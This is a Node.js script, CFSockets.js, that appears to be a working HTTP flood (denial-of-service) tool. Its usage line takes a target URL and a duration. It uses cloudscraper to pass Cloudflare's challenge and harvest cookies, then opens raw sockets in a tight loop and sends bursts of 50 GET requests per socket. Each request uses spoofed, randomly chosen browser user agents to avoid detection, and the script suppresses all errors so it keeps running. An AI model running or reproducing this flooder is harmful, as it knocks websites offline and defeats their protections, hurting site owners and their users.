var cloudscraper = require("cloudscraper");
const EventEmitter = require("events");

const emitter = new EventEmitter();

emitter.setMaxListeners(Number.POSITIVE_INFINITY);

const url = require("url");

if (process.argv.length < 4) {
	console.log("Usage: node CFSockets.js <url> <time>");
	console.log("Usage: node CFSockets.js <http://example.com> <60>");
	process.exit(-1);
}

var target = process.argv[2];
var time = process.argv[3];
var host = url.parse(target).host;

var counter = 0;

var cookie = "";

var userAgents = [
	"Linux / Firefox 29: Mozilla/5.0 (X11; Linux x86_64; rv:29.0) Gecko/20100101 Firefox/29.0",
	"Linux / Chrome 34: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36",
	"Mac / Firefox 29: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0",
	"Mac / Chrome 34: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36",
	"Mac / Safari 7: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14",
	"Windows / Firefox 29: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
	"Windows / Chrome 34: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36",
	"Windows / IE 6: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"Windows / IE 7: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
	"Windows / IE 8: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)",
	"Windows / IE 9: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
	"Windows / IE 10: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
	"Windows / IE 11: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Android / Firefox 29: Mozilla/5.0 (Android; Mobile; rv:29.0) Gecko/29.0 Firefox/29.0",
	"Android / Chrome 34: Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36",
	"iOS / Chrome 34: Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) CriOS/34.0.1847.18 Mobile/11B554a Safari/9537.53",
	"iOS / Safari 7: Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
];

cloudscraper.get(target, function (error, response) {
	if (!error) {
		var parsed = JSON.parse(JSON.stringify(response));
		cookie = (parsed["request"]["headers"]["cookie"]);
		
		if (cookie === undefined) {
			cookie = (parsed["headers"]["set-cookie"]);
		}
	}

	console.log("Received cookies!");
	console.log(cookie);
});

var int = setInterval(() => {
	if (cookie !== "") {
		var s = require("net").Socket();
		s.connect(80, host);
		s.setTimeout(10000);

		for (var i = 0; i < 50; i++) {
			var userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
			s.write("GET " + target + "/ HTTP/1.1\r\nHost: " + host + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: " + userAgent + "\r\nUpgrade-Insecure-Requests: 1\r\nCookie: " + cookie + "\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n");
		}
		
		s.on("data", function () {
			setTimeout(function () {
				s.destroy();
				return delete s;
			}, 5000);
		})
	}
});
setTimeout(() => clearInterval(int), time * 1000);

// to not crash on errors
process.on("uncaughtException", function (err) {
	console.log(err);
});

process.on("unhandledRejection", function (err) {
	console.log(err);
});